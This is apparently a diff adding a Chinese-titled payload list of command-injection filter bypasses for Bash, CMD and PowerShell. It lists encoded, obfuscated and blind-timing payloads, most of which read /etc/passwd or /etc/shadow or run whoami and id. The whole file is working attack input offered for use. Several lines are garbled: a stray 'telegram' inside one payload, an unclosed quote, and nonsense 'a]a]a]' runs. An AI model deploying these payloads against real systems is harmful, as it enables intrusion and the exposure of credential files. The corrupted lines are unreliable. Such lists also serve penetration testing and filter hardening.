@@ -1,0 +1,143 @@
+# 奇葩命令注入绕过
+
+# ========== 空格绕过 ==========
+cat</etc/passwd
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+{cat,/etc/passwd}
+cat%09/etc/passwd
+cat%0a/etc/passwd
+X=$'\x20telegramcat${X}/etc/passwd
+cat<>/etc/passwd
+cat<<<$(</etc/passwd)
+
+# ========== IFS 变体 ==========
+IFS=,;`cat<<<cat,/etc/passwd`
+cat$IFS$9/etc/passwd
+cat${IFS%%a]a]a]a]a]a]/etc/passwd
+
+# ========== 引号绕过 ==========
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\at /etc/passwd
+ca$@t /etc/passwd
+ca$*t /etc/passwd
+ca$xt /etc/passwd
+ca``t /etc/passwd
+c''a''t /etc/passwd
+c""a""t /etc/passwd
+
+# ========== 通配符 ==========
+/???/c?t /???/p??s??
+/???/c?t /???/p?????
+cat /e?c/p?sswd
+cat /e*c/p*wd
+cat /etc/pas*
+/bin/ca? /etc/passwd
+/b??/c?t /e??/p????d
+
+# ========== 变量拼接 ==========
+a]a]a]a]a]a]id
+c]a]t /etc/passwd
+$u
+${u}id
+$(u)id
+w`echo h`o`echo am`i
+/bin/c${u}at /etc/passwd
+c$()at /etc/passwd
+
+# ========== Base64 编码 ==========
+$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)
+echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh
+`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`
+bash -c '{echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|{bash,-i}'
+
+# ========== Hex 编码 ==========
+$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
+echo -e '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'|sh
+$'\x63\x61\x74' /etc/passwd
+
+# ========== 八进制编码 ==========
+$'\143\141\164' /etc/passwd
+$(printf '\143\141\164\40\57\145\164\143\57\160\141\163\163\167\144')
+
+# ========== 反斜杠 ==========
+c\at /et\c/pas\swd
+\c\a\t /\e\t\c/\p\a\s\s\w\d
+/e\tc/pas\swd
+
+# ========== 换行符 ==========
+;%0aid
+|%0aid
+`%0aid`
+$(%0aid)
+%0a/bin/cat%0a/etc/passwd
+
+# ========== 特殊分隔符 ==========
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+$((id))
+{id}
+{id,}
+%0aid
+%0d%0aid
+
+# ========== 时间盲注 ==========
+;sleep${IFS}5
+|sleep${IFS}5
+`sleep${IFS}5`
+$(sleep${IFS}5)
+;ping${IFS}-c${IFS}5${IFS}127.0.0.1
+&timeout${IFS}5
+
+# ========== 无字母数字 (Bash) ==========
+$'\172' # z
+$'\151\144' # id
+__=${#};${!__}<<<${!__}
+${!#}<<<${!#}
+
+# ========== Brace 扩展 ==========
+{cat,/etc/passwd}
+{/bin/cat,/etc/passwd}
+{echo,test}
+{ls,-la}
+
+# ========== 进程替换 ==========
+cat <(cat /etc/passwd)
+diff <(cat /etc/passwd) <(cat /etc/shadow)
+
+# ========== Here String ==========
+cat<<<$(</etc/passwd)
+bash<<<id
+
+# ========== 环境变量利用 ==========
+${PATH:0:1}etc${PATH:0:1}passwd
+${HOME:0:1}etc${HOME:0:1}passwd
+${PWD:0:1}etc${PWD:0:1}passwd
+
+# ========== Windows CMD ==========
+&whoami
+|whoami
+||whoami
+&&whoami
+%0awhoami
+^w^h^o^a^m^i
+w""hoami
+w''hoami
+who"am"i
+set a=who&& set b=ami&& call %a%%b%
+
+# ========== Windows PowerShell ==========
+;whoami
+|whoami
+&whoami
+iex(whoami)
+&{whoami}
+.(whoami)
+$a='who';$b='ami';iex($a+$b)
+[char]119+[char]104+[char]111+[char]97+[char]109+[char]105|iex
